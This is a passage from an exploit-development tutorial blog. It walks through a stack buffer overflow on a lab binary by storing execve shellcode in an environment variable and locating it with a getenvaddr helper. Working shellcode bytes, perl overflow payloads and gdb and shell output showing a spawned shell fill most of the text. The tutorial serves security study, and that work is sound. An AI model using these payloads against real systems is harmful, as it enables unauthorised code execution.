This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
 http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./simple_overflow...(no debugging symbols found)...done.
gdb-peda$ run a
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow a
Hello a
[Inferior 1 (process 2391) exited normally]
Warning: not running
gdb-peda$ break main
Breakpoint 1 at 0x4005a9
gdb-peda$ run a
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow a

...

Breakpoint 1, 0x004005a9 in main ()
gdb-peda$ i r esp
esp 0xbffff444 0xbffff444
gdb-peda$ x/24s $esp +0x240
0xbffff684: "LORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;3"...
0xbffff74c: "1:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:"...
0xbffff814: "*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;"...
0xbffff8dc: "31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*."...
0xbffff9a4: "pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=0"...
0xbffffa6c: "1;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*."...
0xbffffb34: "flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36"...
0xbffffbfc: ":*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
0xbffffc6b: "SSH_CONNECTION=192.168.1.160 56790 192.168.1.208 22"
0xbffffc9f: "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xbffffcc1: "_=/usr/bin/gdb"
0xbffffcd0: "LANG=en_GB.UTF-8"
0xbffffce1: "OLDPWD=/home/debug"
0xbffffcf4: "XDG_SESSION_ID=8"
<b>0xbffffd05: "SHELLCODE=", '\220' repeats 190 times>...</b>
0xbffffdcd: "\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
0xbffffdef: "USER=debug"
0xbffffdfa: "PWD=/home/debug/Documents/exploitdev/chapter2/stack"
0xbffffe2e: "LINES=20"
0xbffffe37: "HOME=/home/debug"
0xbffffe48: "SSH_CLIENT=192.168.1.160 56790 22"
0xbffffe6a: "SSH_TTY=/dev/pts/0"
0xbffffe7d: "COLUMNS=79"
0xbffffe88: "MAIL=/var/mail/debug"
gdb-peda$ </pre>
                                    <p>We can see our Shellcode variable on the Stack at 0xbffffd05 starting with our NOP slide. Let's pick a value in the middle of the NOP slide, bffffd69. Now, we need to rewrite our exploit script. We no longer need the NOP slide or the Shellcode. Indeed it takes a much simpler form. </p>
                                    <pre>(exploit)
$(perl -e 'print "A"x212 . "\x69\xfd\xff\xbf"')</pre>
                                    <p>Wow, that's better. We have replaced the return address with the address of our environment variable on the Stack (or rather the address points to the middle of our NOP Sled). Once we overwrite RET we should jump to our Shellcode at this location. </p>
                                    <pre>gdb-peda$ run $(perl -e 'print "A"x212 . "\x69\xfd\xff\xbf"')
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/simple_overflow $(perl -e 'print "A"x212 . "\x69\xfd\xff\xbf"')

...

Breakpoint 1, 0x00400589 in say_hi ()
gdb-peda$ x/64xw $esp
0xbffff270: 0x00400660  0xbffff288  0xb7fffd8c  0x0040055c
0xbffff280: 0xbffff370  0x00000000  0x41414141  0x41414141
0xbffff290: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff2a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff2b0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff2c0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff2d0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff2e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff2f0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff300: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff310: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff320: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff330: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff340: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff350: 0x41414141  0x41414141  0x41414141  0xbffffd69
0xbffff360: 0xbffff500  0xbffff424  0xbffff430  0x004005b1
gdb-peda$ info frame
Stack level 0, frame at 0xbffff360:
 eip = 0x400589 in say_hi; saved eip = <b>0xbffffd69</b>
 called by frame at 0x41414149
 Arglist at 0xbffff358, args: 
 Locals at 0xbffff358, Previous frame's sp is 0xbffff360
 Saved registers:
 ebx at 0xbffff354, ebp at 0xbffff358, eip at 0xbffff35c
gdb-peda$ continue
Continuing.
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAi���
process 2418 is executing new program: /bin/dash
$ id
[Attaching after process 2418 fork to child process 2421]
[New inferior 2 (process 2421)]
[Detaching after fork from parent process 2418]
[Inferior 1 (process 2418) detached]
process 2421 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
warning: Error reading shared library list entry at 0xffffd030
uid=1000(debug) gid=1000(debug) groups=1000(debug),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare)
$ [Inferior 2 (process 2421) exited normally]
Warning: not running
gdb-peda$ </pre>
                                    <p>Woo, it works! Let's see if it works outside gdb this time. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./simple_overflow $(perl -e 'print "A"x212 . "\x69\xfd\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAi���
$ id
uid=1000(debug) gid=1000(debug) groups=1000(debug),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare)
$ </pre>
                                    <p>Yes, that's what I'm talking about! We have overwritten RET with the memory location of the environment variable containing our Shellcode. And now we have a Shell. As you can see this is a reliable way of exploiting the target. It also simplifies the exploit and we will have less trouble with bad characters because of this (we don't have to worry about writing Shellcode that does not contain any bad characters). </p>
                                    <p>This method has its drawbacks, however, namely, we need to have access to the machine to set an environment variable. If, for example, we are targetting a remote service with a buffer overflow vulnerability, such as an FTP server, we will not be able to write our Shellcode to an environment variable. We will have to rely on jumping to Shellcode on the function's Stack frame in this case as we have done before.</p>

                                    <h2> Improving our Environment Variable Exploit</h2>
                                    <p>At the moment we have a NOP Sled on our exploit code stored in the SHELLCODE environment variable. But since we know the exact location of this address we can jump straight to the Shellcode for execution without the need for a NOP Sled. However, there are some issues we have to address first (no pun intended). </p>
                                    <p>Firstly let's write a program that will give us the memory address of any environment variable we specify. We can do this in C using the getenv() function which takes an environment variable as input and returns its memory address. </p>
                                    <pre>(getenvaddr.c)

#include &#x3C;stdio.h&#x3E;
int main(int argc, char **argv, char **env)
{
 char *ptr;
 ptr=getenv(argv[1]);
 printf(&#x22;%p\n&#x22;, ptr);
 return 0;
}</pre>

                                    <p>We compile this code and then copy the executable, giving the copies names of different lengths. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ gcc -o getenvaddr getenvaddr.c
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ cp getenvaddr a
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ cp getenvaddr bb
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ cp getenvaddr ccc
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ cp getenvaddr dddd
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./a SHELLCODE
0xbffffd59
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./bb SHELLCODE
0xbffffd57
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./ccc SHELLCODE
0xbffffd55
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./dddd SHELLCODE
0xbffffd53
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ </pre>
                                    <p>Notice that the memory address returned is different. How weird. This is because argv[0] (the name of the executable run) is pushed onto the Stack during execution and this changes the location in memory of the SHELLCODE variable. A decrease of two bytes in the address is expected for every bytes increase in the length of the program name. Let's account for this fact by changing our program. </p>
                                    <pre>getenvaddr.c:

#include &#x3C;stdio.h&#x3E;
int main(int argc, char **argv, char **env)
{
 if (argc &#x3C; 3) {
 printf(&#x22;Usage: %s &#x3C;environment variable&#x3E; &#x3C;vulnerable program name&#x3E;&#x22;, argv[0])
 exit(0);
 }

 char *ptr;
 ptr = getenv(argv[1]);
 ptr += (strlen(argv[0]) - strlen(argv[2]))*2;
 printf(&#x22;%p\n&#x22;, ptr);
 return 0;
}
</pre>
                                    <p>This program will print the exact memory location of the SHELLCODE variable when the simple_overflow is executed. We must account for the decrease in the address location because we are running the getenvaddr program itself and also the decrease in the address location when we run the simple_overflow program. We multiply by two because every increase in the length of the program by one-byte corresponds to a decrease in the SHELLCODE variable address by two bytes. </p>
                                    <p>Firstly we re-export our Shellcode without the NOP Sled. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ unset SHELLCODE
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ export SHELLCODE=$(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')</pre>
                                    <p>And now we will find it's location in memory when the simple_overflow program is executed. Note we specify ./ before the simple_overflow program as we will have to run ./simple_overflow from our current directory to run the program. Thus we must account for the "./" in the length of the program.  </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./getenvaddr SHELLCODE ./simple_overflow
0xbffffe09
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$</pre>
                                    <p>Unfortunately, we have a problem. The address contains \x09 which is a bad character for our application. We need to re-export the environment variable until it contains no bad characters. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ unset SHELLCODE
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ export SHELLCODE=$(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./getenvaddr SHELLCODE ./simple_overflow 
0xbffffde8
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$</pre>
                                    <p>This address is free of bad characters and we should be fine to move forward. Now, all we have to do is add this address to our exploit and we should be golden - no debugging required! (Hopefully). </p>
                                    <pre>(exploit)
$(perl -e 'print "A"x212 . "\xe8\xfd\xff\xbf"')</pre>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./simple_overflow $(perl -e 'print "A"x212 . "\xe8\xfd\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ id
uid=1000(debug) gid=1000(debug) groups=1000(debug),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare)
$ 
$ </pre>
                                    <p>And we've done it! We've managed to jump straight to our Shellcode without the need for a NOP Sled. We were able to calculate exactly where the Shellcode was in memory - an impressive feat. </p>
                                    <p>Using environment variables to save Shellcode simplifies the exploit immensely. In the absence of countermeasures like ASLR, we are able to determine the memory address of the Shellcode exactly and we need not worry about writing Shellcode that's free of bad characters. In the next post, we take our exploit to the next level and remove the need for Shellcode altogether!</p>

                                
                                    <p>References:<br>
                                    [1] <a href="https://wiki.archlinux.org/index.php/Environment_variables#:~:text=In%20simple%20terms%2C%20it%20is,or%20the%20system%20locale%20settings">https://wiki.archlinux.org/index.php/Environment_variables#:~:text=In%20simple%20terms%2C%20it%20is,or%20the%20system%20locale%20settings</a><br>
                                    Hacking The Art of Exploitation, 2nd Edition, Jon Erickson
                                    </p>


                                    
                                    <!--<img src="images/left-image.jpg" alt="" class="alignleft"> -->
                                    
                                    <!-- <div class="related-post-block">
                                        
                                        <div class="row">
                                            <div class="col-lg-12 col-sm-12 col-md-12 col-sm-12">
                                                <h3 class="related-post-title">Recommended Posts</h3>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
                                                <div class="related-post">
                                                    
                                                    <div class="related-img">
                                                        <a href="#" class="imghover"><img src="images/related-post-2.jpg" alt="" class="img-responsive"></a>
                                                    </div>
                                                    <div class="related-post-content">
                                                        <h4 class="related-title"><a href="#" class="title">Drinking water dilutes 
stomach acid</a></h4>
                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"diet tips"</a> </span></div>
                                                    </div>
                                                </div>
                                               
                                            </div>
                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
                                                <div class="related-post">
                                                    
                                                    <div class="related-img">
                                                        <a href="#" class="imghover"><img src="images/related-post-1.jpg" alt="" class="img-responsive"></a>
                                                    </div>
                                                    <div class="related-post-content">
                                                        <h4 class="related-title"><a href="#" class="title">Top 5 natural therapies
to fight hpylori</a></h4>
                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"health care</a> </span></div>
                                                    </div>
                                                </div>
                                                
                                            </div>
                                        </div>
                                    </div> -->
                                    <!-- /.related post block -->
                                    <div class="post-navigation">
                                        <!-- post navigation -->
                                        <div class="row">
                                            <div class="nav-links">
                                                <div class="col-md-6 col-sm-6">
                                                    <div class="nav-previous">
                                                        <!-- nav previous -->
                                                        <a href="#" class="prev-link">previous post</a>
                                                        <div class="previous-next-title">
                                                            <h5><a href="#" class="title"></a></h5>
                                                        </div>
                                                    </div>
                                                    <!-- /. nav previous -->
                                                </div>
                                                <div class="col-md-6 col-sm-6">
                                                    <div class="nav-next text-right">
                                                        <!-- nav next -->
                                                        <a href="#" class="next-link">next post</a>
                                                        <div class="previous-next-title">
                                                            <h5><a href="#" class="title"></a></h5>
                                                        </div>
                                                    </div>
                                                    <!-- /.nav previous -->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- /. post navigation -->


                                    
                                    
                                </div>
                                <!-- /.post content -->
                            </div>
                            <!-- /.post holder -->
                        </div>
                    </div>
                </div>
                
            </div>
        </div>
    </div>
    <!-- footer start -->
    <div class="footer">
        <div class="container">
            <div class="row">
                <!-- footer-about-start -->
                
                <!-- footer-useful links-start -->
                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
                    <div class="footer-widget">
                        <h3 class="footer-title">Quick Links</h3>
                        <ul class="angle angle-right">
                            <li><a href="#">Home </a></li>
                            <li><a href="#">Penetration Testing </a></li>
                            <li><a href="#">Exploit Development</a></li>
                            <li><a href="#">Malware</a></li>
                            <li> <a href="#">Shellcode</a></li>
                            <li> <a href="#">All Topics</a></li>
                        </ul>
                    </div>
                </div>

                 
                <img src="../images/logo3.png" alt="" class="alignright"></a>
                      
                <!-- footer-useful links-close -->
                <!-- footer-form-start -->
                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
    
                </div>
                <!-- footer-tiny-text-start -->
                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                    <div class="tiny-footer">
                        <p>© 2020 - BlueHood. All Rights Reserved.</p>
                        <p> See https://easetemplate.com for the Website Template and Other Templates </p>
                    </div>
                </div>
                <!-- footer-tiny-text-start -->
                <!-- footer-form-close -->
            </div>
        </div>
    </div>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="../js/jquery.min.js" type="text/javascript"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="../js/bootstrap.min.js" type="text/javascript"></script>
    <script src="../js/navigation.js" type="text/javascript"></script>
    <script src="../js/menumaker.js" type="text/javascript"></script>
    <script type="text/javascript" src="../js/jquery.sticky.js"></script>
    <script type="text/javascript" src="../js/sticky-header.js"></script>
</body>

</html>